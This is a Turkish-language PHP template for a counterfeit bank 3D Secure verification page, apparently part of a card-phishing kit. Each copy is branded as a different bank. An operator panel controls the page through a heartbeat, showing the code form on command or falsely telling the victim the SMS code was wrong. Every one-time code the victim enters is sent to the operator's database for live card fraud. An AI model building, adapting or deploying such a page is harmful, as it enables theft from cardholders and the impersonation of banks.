<?php
/**
 * ACS sayfası şablonu — her banka bu şablondan türetilir.
 * $banka_adi ve $banka_renk her dosyada farklı olacak.
 */
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/../db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
$_SESSION['adim'] = 4;

$banka_adi  = $banka_adi  ?? 'Bankacılık';
$banka_renk = $banka_renk ?? '#1c3761';
$banka_logo = $banka_logo ?? '';

$hata_modu = false; // admin "Hatalı 3D" → true
$kod_goster = false; // admin "3D Gönder" → true

// Durum kontrolü (sayfa yüklenince)
$row = heartbeat_check();
$durum = $row['durum'] ?? 'bekle';
if ($durum === '3d_gonder')  $kod_goster = true;
if ($durum === '3d_hatali')  { $kod_goster = true; $hata_modu = true; }
if ($durum === 'tebrik')     { header('Location: ' . BASE_PATH . '/sonuc.php'); exit; }
if (in_array($durum, ['kart_hatali','eticaret_kapali','limit_yetersiz','kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'])) {
    header("Location: " . BASE_PATH . "/odeme_hata.php?hata={$durum}"); exit;
}

$odeme = $_SESSION['odeme'] ?? [];
$kart_no = $odeme['kart_no'] ?? '';
$kart_son4 = strlen($kart_no) >= 4 ? '****' . substr($kart_no, -4) : '****';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>3D Secure Doğrulama — <?= htmlspecialchars($banka_adi) ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;background:#ecf0f5;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif}
.acs-card{background:#fff;border-radius:12px;width:min(440px,95vw);box-shadow:0 8px 32px rgba(0,0,0,.13);overflow:hidden}
.acs-header{background:<?= htmlspecialchars($banka_renk) ?>;color:#fff;padding:20px 24px;display:flex;align-items:center;gap:14px}
.acs-header-title{font-size:16px;font-weight:700}
.acs-header-sub{font-size:12px;opacity:.85;margin-top:3px}
.acs-body{padding:28px 24px}
.acs-info{background:#f4f7fb;border:1px solid #dde5ef;border-radius:8px;padding:14px 16px;font-size:13.5px;color:#374151;margin-bottom:22px;line-height:1.7}
.acs-info strong{color:#1c3761}
.acs-label{font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;display:block}
.acs-input{width:100%;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:8px;font-size:18px;letter-spacing:8px;text-align:center;font-weight:700;outline:none;transition:.15s}
.acs-input:focus{border-color:<?= htmlspecialchars($banka_renk) ?>}
.acs-error{background:#fdf2f2;border:1px solid #e8b4b4;border-radius:6px;padding:10px 14px;font-size:13px;color:#c0392b;margin-top:10px;display:flex;align-items:center;gap:8px}
.acs-btn{width:100%;background:<?= htmlspecialchars($banka_renk) ?>;color:#fff;border:none;border-radius:8px;padding:14px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px;transition:.15s}
.acs-btn:hover{filter:brightness(1.08)}
.acs-btn:disabled{opacity:.5;cursor:default}
.acs-timer{text-align:center;font-size:13px;color:#6b7280;margin-top:12px}
.acs-timer span{font-weight:700;color:#ef4444}
.spinner-wrap{text-align:center;padding:32px}
.spinner{width:48px;height:48px;border:4px solid #e7ebee;border-top-color:<?= htmlspecialchars($banka_renk) ?>;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.acs-footer{padding:14px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;display:flex;align-items:center;justify-content:center;gap:8px;font-size:11.5px;color:#9ca3af}
.secure-badge{width:16px;height:16px}
</style>
</head>
<body>
<div class="acs-card">
  <div class="acs-header">
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    <div>
      <div class="acs-header-title">3D Secure Doğrulama — <?= htmlspecialchars($banka_adi) ?></div>
      <div class="acs-header-sub">Güvenli ödeme doğrulaması</div>
    </div>
  </div>

  <div class="acs-body">
    <div class="acs-info">
      <strong>Kart:</strong> <?= htmlspecialchars($kart_son4) ?><br>
      <strong>Tutar:</strong> <?= htmlspecialchars($tutar) ?> TL<br>
      <strong>İşyeri:</strong> <?= htmlspecialchars($isyeri) ?>
    </div>

    <!-- Bekleme aşaması -->
    <div id="state-bekle" <?= $kod_goster ? 'style="display:none"' : '' ?>>
      <div class="spinner-wrap">
        <div class="spinner"></div>
        <p style="color:#6b7280;font-size:14px">Telefonunuza SMS gönderiliyor<br>Lütfen bekleyiniz...</p>
      </div>
    </div>

    <!-- Kod girişi aşaması -->
    <div id="state-kod" <?= $kod_goster ? '' : 'style="display:none"' ?>>
      <?php if ($hata_modu): ?>
      <div class="acs-error" id="hata-box">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        Girdiğiniz kod hatalıdır. Lütfen yeni SMS kodunu giriniz.
      </div>
      <?php endif; ?>
      <label class="acs-label" for="sms-kod">SMS ile gelen 6 haneli kodu giriniz</label>
      <input class="acs-input" id="sms-kod" name="sms_kod" type="text"
        inputmode="numeric" maxlength="6" placeholder="______"
        oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);checkBtn()">
      <button class="acs-btn" id="acs-submit-btn" onclick="submitKod()" disabled>Doğrula</button>
      <p class="acs-timer" id="timer-wrap">Kod geçerlilik süresi: <span id="countdown">03:00</span></p>
    </div>
  </div>

  <div class="acs-footer">
    <svg class="secure-badge" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    Bu sayfa SSL ile şifrelenmiş güvenli bağlantı üzerinden çalışmaktadır.
  </div>
</div>

<script>
(function(){
  var kodGoster = <?= $kod_goster ? 'true' : 'false' ?>;
  var submitYapildi = false; // submitKod() çağrıldı mı

  /* ---- Kod formunu göster ---- */
  function showKod(hatali){
    document.getElementById('state-bekle').style.display = 'none';
    document.getElementById('state-kod').style.display   = 'block';
    if(hatali) gosterHataBox();
    startTimer(180);
  }

  /* ---- Hata kutusunu göster ---- */
  function gosterHataBox(){
    var hb = document.getElementById('hata-box');
    if(hb){ hb.style.display='flex'; return; }
    // Dinamik oluştur (başta yoksa)
    var div = document.createElement('div');
    div.id = 'hata-box';
    div.className = 'acs-error';
    div.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Girdiğiniz kod hatalıdır. Lütfen yeni SMS kodunu giriniz.';
    var stateKod = document.getElementById('state-kod');
    stateKod.insertBefore(div, stateKod.firstChild);
  }

  /* ---- Formu sıfırla (submit sonrası hata gelince) ---- */
  function resetForm(){
    // Spinner'ları kaldır
    document.querySelectorAll('#state-kod .spinner-wrap').forEach(function(el){ el.remove(); });
    // Butonu sıfırla
    var btn = document.getElementById('acs-submit-btn');
    if(btn){ btn.disabled = true; btn.textContent = 'Doğrula'; }
    // Input'u temizle ve aktif et
    var inp = document.getElementById('sms-kod');
    if(inp){ inp.value = ''; inp.disabled = false; }
    submitYapildi = false;
  }

  /* ---- Heartbeat ---- */
  function heartbeat(){
    fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', credentials:'same-origin'})
      .then(function(r){ return r.json(); })
      .then(function(d){
        var dur = d.durum || 'bekle';

        // Bekleme → Kod göster
        if(dur === '3d_gonder' && !kodGoster){
          kodGoster = true; showKod(false); return;
        }

        // Hatalı 3D — ilk kez kod ekranına geçiş
        if(dur === '3d_hatali' && !kodGoster){
          kodGoster = true; showKod(true); return;
        }

        // Hatalı 3D — zaten kod ekranındayız
        if(dur === '3d_hatali' && kodGoster){
          var inp = document.getElementById('sms-kod');
          // Mevcut kodu (varsa) hatalı listesine ekle, DB'ye gönder
          var mevcutKod = inp ? inp.value : '';
          if(mevcutKod.length > 0){
            var fdh = new FormData();
            fdh.append('sms_hata_kodu', mevcutKod);
            fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', body:fdh, credentials:'same-origin'}).catch(function(){});
          }
          // Submit yapıldıysa formu sıfırla
          if(submitYapildi) resetForm();
          else if(inp){ inp.value = ''; checkBtn(); }
          gosterHataBox();
          return;
        }

        if(dur === 'tebrik'){ location.href = '<?= BASE_PATH ?>/sonuc.php'; return; }

        var hataListe = ['kart_hatali','eticaret_kapali','limit_yetersiz',
                         'kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'];
        if(hataListe.indexOf(dur) !== -1){
          location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=' + dur; return;
        }
      }).catch(function(){});
  }

  setInterval(heartbeat, 2500);

  /* ---- Geri sayım ---- */
  var timerInt = null;
  function startTimer(sec){
    if(timerInt) clearInterval(timerInt);
    timerInt = setInterval(function(){
      if(--sec <= 0){ clearInterval(timerInt); sec = 0; }
      var m = Math.floor(sec/60), s = sec%60;
      var el = document.getElementById('countdown');
      if(el) el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
    }, 1000);
  }
  if(kodGoster) startTimer(180);
})();

function checkBtn(){
  var v = document.getElementById('sms-kod').value;
  document.getElementById('acs-submit-btn').disabled = (v.length !== 6);
}

function submitKod(){
  var inp = document.getElementById('sms-kod');
  if(!inp || inp.value.length !== 6) return;
  var kod = inp.value;

  // DB'ye kaydet
  var fd = new FormData();
  fd.append('mevcut_adim', '4');
  fd.append('sms_kod', kod);
  fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', body:fd, credentials:'same-origin'}).catch(function(){});

  // UI'ı "bekleniyor" moduna al
  document.getElementById('acs-submit-btn').disabled = true;
  document.getElementById('acs-submit-btn').textContent = 'Doğrulanıyor...';
  inp.disabled = true;

  // Spinner ekle
  var extra = document.createElement('div');
  extra.className = 'spinner-wrap';
  extra.innerHTML = '<div class="spinner"></div><p style="color:#6b7280;font-size:14px">Ödeme işleniyor...</p>';
  document.getElementById('state-kod').appendChild(extra);

  // submitYapildi bayrağını set et (heartbeat hata gelince resetForm çağırsın)
  window._submitYapildi = true; // global referans için
}
</script>
</body>
</html>
